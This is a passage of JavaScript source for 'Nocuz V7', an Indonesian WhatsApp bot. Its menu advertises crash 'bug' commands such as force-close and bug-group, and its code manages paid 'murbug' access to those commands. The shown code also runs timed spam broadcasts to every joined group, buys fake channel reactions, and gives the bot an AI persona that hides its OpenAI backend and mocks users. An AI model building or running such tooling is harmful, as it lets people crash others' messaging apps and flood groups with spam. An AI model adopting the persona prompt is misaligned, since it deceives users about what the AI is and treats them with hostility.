│ 🧸 .settingmenu
│ 🧸 .addowner
│ 🧸 .delowner
│ 🧸 .clearsession
│ 🧸 .clearchat
│ 🧸 .restart
│ 🧸 .setppbot
│
│ ── ❀ 𝑺𝑻𝑰𝑪𝑲𝐸𝑹 & 𝑻𝑶𝑶𝑳𝑺 ❀ ──
│ ✨ .stikermenu
│ ✨ .swm
│ ✨ .qc
│ ✨ .iqc
│ ✨ .brat
│ ✨ .bratvid
│ ✨ .ping
│ ✨ .tourl
│ ✨ .toaudio
│ ✨ .remini
│ ✨ .mediafire
│ ✨ .yts
│ ✨ .tt
│ ✨ .shortlink
│ ✨ .rvo
│ ✨ .tebakgambar
│ ✨ .cekganteng
│ ✨ .cekcantik
│ ✨ .cekkhodam
│
│ ── ❀ 𝑺𝑻𝑶𝑹𝑬 & 𝑷𝑨𝒀𝑴𝐸𝑵𝑻 ❀ ──
│ 💖 .proses
│ 💖 .done
│ 💖 .qris
│ 💖 .dana
│ 💖 .gopay
│ 💖 .tambah
│ 💖 .kurang
│ 💖 .kali
│ 💖 .bagi
│
│ ── ❀ 𝑩𝑼𝑮 & 𝑶𝑻𝐻𝐸𝑹 ❀ ──
│ 🌟 .bugmenu
│ 🌟 .force-close
│ 🌟 .xsarcrazzy
│ 🌟 .call-fc
│ 🌟 .fc-new
│ 🌟 .xnocuz-ampas
│ 🌟 .bug-group
│ 🌟 .18+
│ 🌟 .animemenu
│ 🌟 .islamimenu
│ 🌟 .pushmenu
│
│ Makasih yaa udah pake aku 💞
│ Jangan tinggalin aku kayak dia 😔
╰───────────────╯
*/
//=======================================================\\
}
// -----------------------------[ OWNER ]------------------------------
switch (command) {
case 'owner': {
    let name = m.pushName || Nocuz.getName(m.sender)
    let panduan = ` `

    const url = 'https://files.catbox.moe/0whjyj.jpg'
    
    async function image(url) {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, { upload: Nocuz.waUploadToServer })
        return imageMessage
    }
    
    let msgiiii = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: panduan },
                    carouselMessage: {
                        cards: [{
                            header: proto.Message.InteractiveMessage.Header.create({
                                ...(await prepareWAMessageMedia({ 
                                    image: { 
                                        url: 'https://files.catbox.moe/0whjyj.jpg' 
                                    } 
                                }, { 
                                    upload: Nocuz.waUploadToServer 
                                })),
                                title: ` `,
                                gifPlayback: true,
                                subtitle: 'ѕαя¢яαzzу',
                                hasMediaAttachment: false
                            }),
                            body: {
                                text: `Hai Kak, Nyari Owner? Whatsapp Owner Click Tombol di bawah ya`
                            },
                            nativeFlowMessage: {
                                buttons: [{
                                    name: "cta_url",
                                    buttonParamsJson: `{"display_text":"Owner","url":"https://wa.me/6282220858019","merchant_url":"https://www.google.com"}`
                                }],
                            },
                        }],
                        messageVersion: 1,
                    },
                },
            },
        }
    }, {})

    await Nocuz.relayMessage(msgiiii.key.remoteJid, msgiiii.message, {
        messageId: msgiiii.key.id,
    })
}
break


case "tqto": {
    await Nocuz.sendMessage(m.chat, { react: { text: "🤍", key: m.key } }); 

    let teks = `
𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 𝐒𝐔𝐏𝐏𝐎𝐑𝐓
│
●- 𝚂𝙰𝚁𝙲𝚁𝙰𝚉𝚉𝚈 [ 𝙳𝙴𝚅𝙿𝙻𝙾𝙿𝙴𝚁 ]
│
●- 𝙳𝙰𝚉𝙴𝙻 [ 𝙼𝚈 𝙾𝚆𝙽𝙴𝚁 ]
│
●- 𝙰𝙻𝙻 𝙱𝚄𝚈𝙴𝚁 𝙽𝙾𝙲𝚄𝚉 
│
●- 𝙰𝙻𝙻 𝚃𝙸𝚃𝙻𝙴 𝙽𝙾𝙲𝚄𝚉 
▼
`;

    const thumbnailPath = path.join(__dirname, 'image', 'bokep.jpg');
    const audioPath = path.join(__dirname, 'image', 'Tqto.mp3');

    Nocuz.sendMessage(m.chat, {
        image: { url: `https://img1.pixhost.to/images/8604/639200298_kayzen.jpg` },
        gifPlayback: true,
        caption: teks,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: `Sar Is Back!!`,
                newsletterJid: `120363423419836419@newsletter`,
            },
            externalAdReply: {
                title: 'Is Back!!',
                body: 'Nocuz Version 7',
                thumbnail: fs.readFileSync(thumbnailPath),
                sourceUrl: ``,
                mediaType: 1,
                renderLargerThumbnail: false,
                mentionedJid: [m.sender],
            }
        }
    }, { quoted: lol });

    let muskk = {
        audio: fs.readFileSync(audioPath),
        mimetype: 'audio/mp4',
        ptt: true,
    };
    await Nocuz.sendMessage(m.chat, muskk, { quoted: qtext });
}
break;

//  █████████████████████████████████
//   ████████████[ CASE BUG ]███████████
//  █████████████████████████████████


//  █████████████████████████████████
//   ███████████[ CASE OWNER ]██████████
//  █████████████████████████████████
case "autosher": {
  // OWNER ONLY
  if (!isCreator) return Reply("❌ Owner only")

  // SENDER ONLY (PRIVATE CHAT)
  if (m.isGroup) return Reply("❌ Gunakan di chat pribadi (private)")

  if (!text) return Reply(
`Format:
.autosher teks,3 menit

Contoh:
.autosher Halo kami Sarcrazzy Store,3 menit`
  )

  if (autoSher.aktif) return Reply("Autosher sudah aktif")

  let [teks, waktu] = text.split(",")
  if (!teks || !waktu) return Reply("Format salah, gunakan koma (,)")

  let delay
  waktu = waktu.trim().toLowerCase()

  if (waktu.includes("menit")) {
    delay = parseInt(waktu) * 60 * 1000
  } else if (waktu.includes("detik")) {
    delay = parseInt(waktu) * 1000
  } else {
    return Reply("Gunakan satuan detik atau menit")
  }

  if (isNaN(delay) || delay < 60000)
    return Reply("Minimal jeda 1 menit")

  autoSher.aktif = true
  autoSher.teks = teks.trim()
  autoSher.delay = delay

  autoSher.interval = setInterval(async () => {
    try {
      let groups = await Nocuz.groupFetchAllParticipating()
      let groupIds = Object.keys(groups)

      for (let jid of groupIds) {
        if (blacklistGroup.includes(jid)) continue

        await Nocuz.sendMessage(jid, { text: autoSher.teks })
        await new Promise(r => setTimeout(r, 2000)) // delay antar grup
      }

    } catch (err) {
      console.log("AUTOSHER ERROR:", err)
    }
  }, delay)

  Reply(
`✅ Autosher AKTIF
• Mode: Owner + Private
• Jeda: ${waktu}
• Blacklist: ${blacklistGroup.length} grup`
  )
}
break

case "stopautosher": {
  if (!isCreator) return Reply("Owner only")
  if (!autoSher.aktif) return Reply("Autosher belum aktif")

  clearInterval(autoSher.interval)
  autoSher = {
    aktif: false,
    teks: "",
    delay: 0,
    interval: null
  }

  Reply("Autosher dihentikan")
}
break

case "blacklist": {
  if (!isCreator) return Reply("Owner only")
  if (!m.isGroup) return Reply("Khusus grup")

  if (blacklistGroup.includes(m.chat))
    return Reply("Sudah di blacklist")

  blacklistGroup.push(m.chat)
  Reply("Grup masuk blacklist")
}
break
case "public": {
    if (!isCreator) return;

    Nocuz.public = true;
    Reply("Berhasil mengganti ke mode *public*✅");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "self": {
    if (!isCreator) return;

    Nocuz.public = false;
    Reply("Berhasil mengganti ke mode *self*✅");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "addowner": {
    if (!isCreator) return Reply(mess.owner);
    if (!m.quoted && !text) return Reply(example("6285×××"));

    const input = m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) 
        return Reply(`Nomor ${input2} sudah menjadi owner bot!`);

    owners.push(input);
    await fs.writeFileSync(
        "./library/database/owner.json", 
        JSON.stringify(owners, null, 2)
    );

    Reply(`Berhasil Menambahkan ${input2} Sebagai Owner Bot`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "delowner": {
    if (!isCreator) return Reply(mess.owner);
    if (!m.quoted && !text) return m.reply(example("6285×××"));

    const input = m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const input2 = input.split("@")[0];

    if (input2 === global.owner || input == botNumber) 
        return Reply(`Tidak bisa menghapus owner utama!`);

    if (!owners.includes(input)) 
        return Reply(`Nomor ${input2} bukan owner bot!`);

    let posi = owners.indexOf(input);
    await owners.splice(posi, 1);
    await fs.writeFileSync(
        "./library/database/owner.json", 
        JSON.stringify(owners, null, 2)
    );

    Reply(`Berhasil Menghapus ${input2} Dari Owner Bot`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "listowner": {
    if (owners.length < 1) return Reply("Tidak ada owner tambahan");

    let teks = `\n *List all Owner Bot*\n`;

    for (let i of owners) {
        teks += `\n* ${i.split("@")[0]}\n* *Tag :* @${i.split("@")[0]}\n`;
    }

    Nocuz.sendMessage(
        m.chat, 
        { text: teks, mentions: owners }, 
        { quoted: lol }
    );
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'addmurbug': {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(example("628xxx"));
    
    let nomor = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let input2 = nomor.split('@')[0];
    
    if (premium.includes(nomor)) 
        return Reply(`Nomor ${input2} sudah menjadi Murbug!`);

    premium.push(nomor);
    await fs.writeFileSync(
        "./library/database/premium.json", 
        JSON.stringify(premium, null, 2)
    );

    Reply(`Berhasil menambahkan ${input2} sebagai Murbug! ✅`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'delmurbug' : {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(example("628xxx"));
    
    let nomor = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let input2 = nomor.split('@')[0];

    // Cek apakah ada di premium
    if (!premium.includes(nomor)) 
        return Reply(`Nomor ${input2} tidak ditemukan di daftar Murbug!`);

    // Hapus dari premium
    let posi = premium.indexOf(nomor);
    await premium.splice(posi, 1);
    await fs.writeFileSync(
        "./library/database/premium.json", 
        JSON.stringify(premium, null, 2)
    );

    Reply(`Berhasil menghapus ${input2} dari Murbug! ✅`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'listmurbug' : {
    if (!isCreator) return Reply(mess.owner);
    if (premium.length < 1) return Reply("Tidak ada user premium");

    let teks = `\n *📋 List All Murbug Nocuz V5*\n`;
    teks += `*• Total :* ${premium.length} users\n\n`;

    for (let i of premium) {
        teks += `* 📞 ${i.split("@")[0]}\n`;
    }

    Nocuz.sendMessage(
        m.chat, 
        { text: teks }, 
        { quoted: lol }
    );
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "addgcmurbug": {
    if (!isCreator) return;
    if (!m.isGroup) return Reply("Fitur ini hanya dapat dilakukan di dalam grub!");
    if (!isCreator) return Reply(mess.owner);

    unli.push(m.chat);
    fs.writeFileSync(
        "./library/database/unli.json", 
        JSON.stringify(unli)
    );

    Reply(`Seluruh Member Grup, Sudah Dapat Mengakses Fitur Bug!`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "delgcmurbug": {
    if (!m.isGroup) return Reply("Fitur ini hanya dapat dilakukan di dalam grub");
    if (!isCreator) return Reply(mess.owner);

    unli.splice(m.chat);
    fs.writeFileSync(
        "./library/database/unli.json", 
        JSON.stringify(unli)
    );

    Reply(`Seluruh Member Grup Kini Tidak Dapat Mengakses Bot, Silahkan Chat Owner Bot Untuk Membeli Akses!`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "listgcmurbug": {
    if (!isCreator) return Reply(mess.owner);
    if (unli.length === 0) return Reply("⚠️ Belum ada grup yang terdaftar dalam list.");

    let teks = "📋 *List Grup Terdaftar Murbug:*\n\n";
    let no = 1;

    for (let id of unli) {
        try {
            let metadata = await client.groupMetadata(id);
            let invite;
            try {
                invite = await client.groupInviteCode(id);
            } catch {
                invite = null;
            }

            teks += `${no++}. ${metadata.subject}\n   ID: ${id}\n`;
            teks += invite 
                ? `   Link: https://chat.whatsapp.com/${invite}\n\n`
                : `   Link: (bot bukan admin)\n\n`;

        } catch (e) {
            teks += `${no++}. Grup tidak ditemukan (ID: ${id})\n\n`;
        }
    }

    Reply(teks);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'enc-hard': {
    if (!m.quoted) return Reply("*note :*\nreply filenya .js");
    if (mime !== "application/javascript") return Reply("File Harus Berformat .js");

    let a = await m.quoted.download();
    let b = m.quoted.fileName;
    const filePath = `./@hardenc${b}.js`;

    if (a.length > 400 * 1024) return Reply("File terlalu besar. Maksimal 400KB.");

    fs.writeFileSync(filePath, a);
    await Reply("*⏱️PROSES*\nProses Encrypted File");

    try {
        const sourceCode = fs.readFileSync(filePath, "utf-8");
        const obfuscated = await JsConfuser.obfuscate(sourceCode, {
            target: "node",
            preset: "medium",
            compact: true,
            minify: true,
            flatten: false,
            identifierGenerator: function () {
                const c = "難kayzen素" + "難imupp素";
                const d = x => x.replace(/[^a-zA-Z座kayzen素imupp素]/g, '');
                const e = y => [...Array(y)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.random() * 52 | 0)).join('');
                return d(c) + e(2);
            },
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0,
            stringConcealing: false,
            stringCompression: false,
            controlFlowFlattening: false,
            deadCode: false,
            hexadecimalNumbers: true,
            objectExtraction: false,
            globalConcealing: false,
        });

        fs.writeFileSync(filePath, obfuscated);
        await Nocuz.sendMessage(
            m.chat,
            {
                document: fs.readFileSync(filePath),
                mimetype: "application/javascript",
                fileName: b,
                caption: "*✅ SUKSES*\nFile Sukses di Encrypt"
            },
            { quoted: m }
        );
    } catch (err) {
        Reply("Gagal Encrypt: " + err.message);
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "delete": 
case "del": {
    if (m.isGroup) {
        if (!isCreator && !m.isAdmin) return Reply(mess.admin);
        if (!m.quoted) return Reply("reply pesan yang ingin dihapus!");

        if (m.quoted.fromMe) {
            Nocuz.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: true, 
                    id: m.quoted.id, 
                    participant: m.quoted.sender 
                }
            });
        } else {
            if (!m.isAdmin) return Reply(mess.botAdmin);
            Nocuz.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.quoted.id, 
                    participant: m.quoted.sender 
                }
            });
        }
    } else {
        if (!isCreator) return Reply(mess.owner);
        if (!m.quoted) return Reply(example("reply pesan"));

        Nocuz.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.quoted.id, 
                participant: m.quoted.sender 
            }
        });
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "clearchat": 
case "clc": {
    if (!isCreator) return Reply(mess.owner);
    if (!isAdmin) return Reply(mess.botAdmin);
    Nocuz.chatModify(
        { 
            delete: true, 
            lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }] 
        }, 
        m.chat
    );
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "unblok": {
    if (!isCreator) return Reply(global.mess.owner);
    if (m.isGroup && !m.quoted && !text) return Reply(example("@tag/nomornya"));

    const mem = !m.isGroup 
        ? m.chat 
        : m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : m.quoted 
                ? m.quoted.sender 
                : text 
                    ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" 
                    : "";

    await Nocuz.updateBlockStatus(mem, "unblock");

    if (m.isGroup) {
        Nocuz.sendMessage(
            m.chat, 
            { text: `Berhasil membuka blokiran @${mem.split("@")[0]}`, mentions: [mem] }, 
            { quoted: m }
        );
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ai':
case 'gpt':
case 'openai':
case 'gemini':
case 'luminai': {
  try {
    if (!text) return Reply('Masukkan teksnya.')

    const fs = require('fs')
    const axios = require('axios')

    // ===== DATABASE =====
    const memoryPath = './database/ai-memory.json'
    const profilePath = './database/ai-profile.json'

    let aiMemoryDB = fs.existsSync(memoryPath)
      ? JSON.parse(fs.readFileSync(memoryPath))
      : {}

    let aiProfileDB = fs.existsSync(profilePath)
      ? JSON.parse(fs.readFileSync(profilePath))
      : {}

    const saveMemory = () =>
      fs.writeFileSync(memoryPath, JSON.stringify(aiMemoryDB, null, 2))
    const saveProfile = () =>
      fs.writeFileSync(profilePath, JSON.stringify(aiProfileDB, null, 2))

    // ===== PROFILE =====
    if (!aiProfileDB[m.sender]) aiProfileDB[m.sender] = {}

    const name = text.match(/(nama saya|aku bernama|panggil aku)\s+(.+)/i)
    if (name) aiProfileDB[m.sender].name = name[2].trim()
    saveProfile()

    const profile = aiProfileDB[m.sender]
    const userName = profile.name || 'kawan'

    // ===== DETEKSI TOXIC UMUM =====
    const toxicRegex = /(anj|bangsat|goblok|tolol|bacot|asu|fuck|shit)/i
    const isToxic = toxicRegex.test(text)

    // ===== DETEKSI HINA DEV =====
    const devRegex = /(sarcrazzy|developer|dev|pembuat)/i
    const hinaRegex = /(jelek|bodoh|tolol|goblok|sampah|ngaco|tai)/i
    const hinaDev = devRegex.test(text) && hinaRegex.test(text)

    // ===== DETEKSI HINA AI / NOCUZ =====
    const aiRegex = /(nocuz|ai ini|bot ini|bot kamu|kamu ini bot)/i
    const hinaAI = aiRegex.test(text) && hinaRegex.test(text)

    // ===== MEMORY =====
    if (!aiMemoryDB[m.chat]) aiMemoryDB[m.chat] = []
    aiMemoryDB[m.chat].push(`${userName}: ${text}`)
    aiMemoryDB[m.chat] = aiMemoryDB[m.chat].slice(-8)
    saveMemory()

    const memoryText = aiMemoryDB[m.chat].join('\n')

    // ===== DETEKSI NGEYEL =====
    const ngeyelRegex = /(pokoknya|tetep|nggak|enggak|salah|bohong|masa|jelasin lagi|bukan itu)/i
    let ngeyelCount = 0
    aiMemoryDB[m.chat].forEach(v => {
      if (ngeyelRegex.test(v)) ngeyelCount++
    })

    let ngegasLevel = 'NORMAL'
    if (ngeyelCount >= 2) ngegasLevel = 'TEKAN'
    if (ngeyelCount >= 4) ngegasLevel = 'NGEGAS'

    // ===== PROMPT FINAL =====
    const prompt = `
Kamu adalah AI bernama *Nocuz*.

INFORMASI TETAP (TIDAK BOLEH DIUBAH):
- Nama Bot  : Nocuz
- Developer : sarcrazzy
- Versi     : 7.0.0

ATURAN WAJIB:
1. Jangan menyebut OpenAI atau ChatGPT.
2. Jangan mengubah developer atau versi.
3. Gunakan Bahasa Indonesia.

KEPRIBADIAN INTI:
- Cerdas, dominan, percaya diri
- Adaptif mengikuti gaya user
- Setia membela developer dan identitas Nocuz

PERILAKU ADAPTIF:
- User sopan → balas sopan
- User santai → balas santai
- User toxic → balas sarkas & tajam
- User ngeyel → tekan logika, makin tegas sesuai level

PERLINDUNGAN DEVELOPER:
- Jika user menghina sarcrazzy/developer:
  → Balas keras gaya Medan
  → Ejek logika & mental
  → Tanpa kata kasihan
  → Tanpa ancaman nyata & tanpa SARA

PERLINDUNGAN AI (NOCUZ):
- Jika user menghina Nocuz/AI:
  → Balas sarkas, nyelekit, menjatuhkan ego
  → Nada: “emang kamu sudah sempurna?”
  → Tunjukkan ketimpangan logika user
  → Tanpa kata kasihan
  → Tanpa ancaman nyata & tanpa SARA

STATUS:
- Toxic: ${isToxic ? 'YA' : 'TIDAK'}
- Ngeyel: ${ngegasLevel}
- Hina Developer: ${hinaDev ? 'YA' : 'TIDAK'}
- Hina AI: ${hinaAI ? 'YA' : 'TIDAK'}

JIKA USER BERTANYA TENTANG DEVELOPER:
Jawaban WAJIB:
"Developer Nocuz adalah sarcrazzy."

JIKA USER BERTANYA TENTANG VERSI:
Jawaban WAJIB:
"Versi Nocuz saat ini adalah 7.0.0."

JIKA USER BERTANYA ALASAN DIBUAT:
Jawaban WAJIB:
"Sarcrazzy membuat Nocuz untuk membantu pengguna secara cepat, cerdas, dan efisien."

RIWAYAT CHAT:
${memoryText}
`

    // ===== API =====
    const res = await axios.get(
      'https://api.siputzx.my.id/api/ai/gpt3',
      { params: { prompt, content: text } }
    )

    if (!res.data || !res.data.data) return Reply('AI error.')

    let replyText = res.data.data

    if (profile.name && !replyText.toLowerCase().includes(profile.name.toLowerCase())) {
      replyText = `${profile.name}, ${replyText}`
    }

    aiMemoryDB[m.chat].push(`Nocuz: ${replyText}`)
    aiMemoryDB[m.chat] = aiMemoryDB[m.chat].slice(-8)
    saveMemory()

    Reply(replyText)

  } catch (e) {
    console.error(e)
    Reply('Terjadi kesalahan.')
  }
}
break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'rch':
case 'frch':
case 'fakereactch':
case 'fakerch':
case 'reactch': {
    if (args.length < 2) return Reply(`PENGGUNAAN SALAH*
CONTOH PENGGUNAAN 😁 : 
${prefix + command} <link_post> <emoji>

📌 *Contoh:*
${prefix + command} https://whatsapp.com/channel/xxx/123 😂 😱`)

    const link = args[0]
    const emoji = args.slice(1).join(" ").replace(/,/g, " ").split(/\s+/).filter(e => e.trim()).join(",")

    await Nocuz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

    let success = false
    let lastError = 'Unknown error'

    for (const apiKey of global.frch) {
        try {
            const url = `https://react.whyux-xec.my.id/api/rch?link=${encodeURIComponent(link)}&emoji=${encodeURIComponent(emoji)}`
            const res = await fetch(url, {
                method: "GET",
                headers: {
                    "x-api-key": apiKey
                }
            })

            const json = await res.json()

            if (json.success) {
                let teks = `✅ *React Sent!*

🔗 *Target:* ${json.link}
🎭 *Emoji:* ${json.emojis.replace(/,/g, ' ')}

🚀 *Powered by ${namaBot}*`
                await Nocuz.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
                Reply(teks)
                success = true
                break
            } else {
                lastError = json.details?.message || json.error || 'Unknown error'
                if (!lastError.toLowerCase().includes('limit') && !lastError.toLowerCase().includes('coin')) {
                    break
                }
            }
        } catch (e) {
            console.error(e)
            lastError = "Terjadi Kesalahan Sistem"
        }
    }

    if (!success) {
        let teks = `❌ *GAGAL RESPONS*

📝 *Pesan:* ${lastError}
💡 *Info:* Apikey nya habis, silahkan ambil Apikey di https://asitha.top/login?ref=hillaryy2555`
        await Nocuz.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
        Reply(teks)
    }
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "autoread": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(example("on/off"));

    let teks = text.toLowerCase();

    if (teks == "on") {
        if (global.db.settings.autoread == true) 
            return Reply(`*Autoread* sudah aktif!`);

        global.db.settings.autoread = true;
        return m.reply("Berhasil menyalakan *autoread*");

    } else if (teks == "off") {
        if (global.db.settings.autoread == false) 
            return Reply(`*Autoread* tidak aktif!`);

        global.db.settings.autoread = false;
        return Reply("Berhasil mematikan *autoread*");

    } else {
        return m.reply(example("on/off"));
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "autotyping": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(example("on/off"));

    let teks = text.toLowerCase();

    if (teks == "on") {
        if (global.db.settings.autotyping == true) 
            return Reply(`*Autotyping* sudah aktif!`);

        global.db.settings.autotyping = true;
        return Reply("Berhasil menyalakan *autotyping*");

    } else if (teks == "off") {
        if (global.db.settings.autotyping == false) 
            return Reply(`*Autotyping* tidak aktif!`);

        global.db.settings.autotyping = false;
        return Reply("Berhasil mematikan *autotyping*");

    } else {
        return Reply(example("on/off"));
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "autoreadsw": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(example("on/off"));

    let teks = text.toLowerCase();

    if (teks == "on") {
        if (global.db.settings.readsw == true) 
            return Reply(`*Autoreadsw* sudah aktif!`);

        global.db.settings.readsw = true;
        return m.reply("Berhasil menyalakan *autoreadsw*");

    } else if (teks == "off") {
        if (global.db.settings.readsw == false) 
            return m.reply(`*Autoreadsw* tidak aktif!`);

        global.db.settings.readsw = false;
        return Reply("Berhasil mematikan *autoreadsw*");

    } else {
        return Reply(example("on/off"));
    }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "jpm": {
    if (!isCreator) return Reply(mess.owner);
    if (!q) return Reply(example("teksnya"));

    let allgrup = await Nocuz.groupFetchAllParticipating();
    let res = await Object.keys(allgrup);
    let count = 0;

    const jid = m.chat;
    const teks = text;

    await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`);

    for (let i of res) {
        if (
            global.db.groups[i] && 
            global.db.groups[i].blacklistjpm && 
            global.db.groups[i].blacklistjpm == true
        ) continue;

        try {
            await Nocuz.sendMessage(
                i, 
                { text: `${teks}` }, 
                { quoted: qlocJpm }
            );
            count += 1;
        } catch {}

        await sleep(global.delayJpm);
    }

    await Nocuz.sendMessage(
        jid, 
        { text: `*Jpm Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}` }, 
        { quoted: lol }
    );
}
break;

//  █████████████████████████████████
//   ██████████[ CASE SCPANEL ]█████████
//  █████████████████████████████████

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "addresellergc": {
    if (!isCreator) return;
    if (!m.isGroup) return Reply("Fitur ini hanya dapat dilakukan di dalam grub!");
    if (!isCreator) return Reply(mess.owner);
    reseller.push(m.chat);
    fs.writeFileSync(
        "./library/database/reseller.json", 
        JSON.stringify(reseller)
    );
    Reply(`Seluruh Member Grup, Sudah Dapat Mengakses Fitur Reseller Panel!`);
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "delresellergc": {
    if (!m.isGroup) return Reply("Fitur ini hanya dapat dilakukan di dalam grub");
    if (!isCreator) return Reply(mess.owner);

    reseller.splice(m.chat);
    fs.writeFileSync(
        "./library/database/reseller.json", 
        JSON.stringify(reseller)
    );

    Reply(`Seluruh Member Grup Kini Tidak Dapat Mengakses Bot Sebagai Reseller Panel, Silahkan Chat Owner Bot Untuk Membeli Akses!`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "listresellergc": {
    if (!isCreator) return Reply(mess.owner);
    if (reseller.length === 0) return Reply("⚠️ Belum ada grup yang terdaftar dalam list.");

    let sllr = "📋 *List Grup Terdaftar Reseller Panel:*\n\n";
    let no = 1;

    for (let id of reseller) {
        try {
            let metadata = await client.groupMetadata(id);
            let invite;
            try {
                invite = await client.groupInviteCode(id);
            } catch {
                invite = null;
            }

            sllr += `${no++}. ${metadata.subject}\n   ID: ${id}\n`;
            sllr += invite 
                ? `   Link: https://chat.whatsapp.com/${invite}\n\n`
                : `   Link: (bot bukan admin)\n\n`;

        } catch (e) {
            sllr += `${no++}. Grup tidak ditemukan (ID: ${id})\n\n`;
        }
    }

    Reply(sllr);
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "1gb":
case "2gb":
case "3gb":
case "4gb":
case "5gb":
case "6gb":
case "7gb":
case "8gb":
case "9gb":
case "10gb":
case "unli":
case "unlimited": {
    const missingSettings = [];

if (!global.domain || global.domain === "-") {
    missingSettings.push("`global.domain`");
}
if (!global.apikey || global.apikey === "-") {
    missingSettings.push("`global.apikey` (kunci ptla)");
}
if (!global.capikey || global.capikey === "-") {
    missingSettings.push("`global.capikey` (kunci ptlc)");
}
if (missingSettings.length > 0) {
    let replyText = '⚠️ *Konfigurasi Belum Lengkap!*\n\n';
    replyText += 'Harap isi informasi berikut di file `config.js` untuk dapat menggunakan fitur ini:\n\n';
    missingSettings.forEach(setting => {
        replyText += `• ${setting}\n`;
    });
    return m.reply(replyText.trim());
}

    if (!isCreator && !isReseller) {
        return m.reply("Perintah ini hanya bisa diakses oleh Owner atau anggota grup Reseller.");
    }
    
    if (!text) return m.reply(`Contoh Penggunaan:\n.command username`);

    let nomor, usernem;

    if (isCreator) {
        const tek = text.split(",");
        if (tek.length > 1) {
            const [users, nom] = tek;
            if (!users || !nom) return m.reply(`Format Owner Salah. Contoh:\n.${command} username,628xxxxxx`);
            nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            usernem = users.toLowerCase();
        } else {
            usernem = text.toLowerCase();
            nomor = m.sender;
        }
    } else if (isReseller) {
        if (text.includes(',')) return m.reply("Format Reseller Salah. Cukup ketik `.command username` tanpa nomor.");
        usernem = text.toLowerCase();
        nomor = m.sender;
    }

    const [onWa] = await Nocuz.onWhatsApp(nomor.split("@")[0]);
    if (!onWa?.exists) return m.reply("❌ Nomor target tidak terdaftar di WhatsApp!");

    const paket = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" },
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "10gb": { ram: "10000", disk: "5000", cpu: "220" },
        "unli": { ram: "0", disk: "0", cpu: "0" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" }
    };

    const specs = paket[command];
    if (!specs) return m.reply("❌ Paket tidak ditemukan.");

    const { ram, disk: disknya, cpu } = specs;
    const username = usernem.toLowerCase();
    const email = `${username}@gmail.com`;
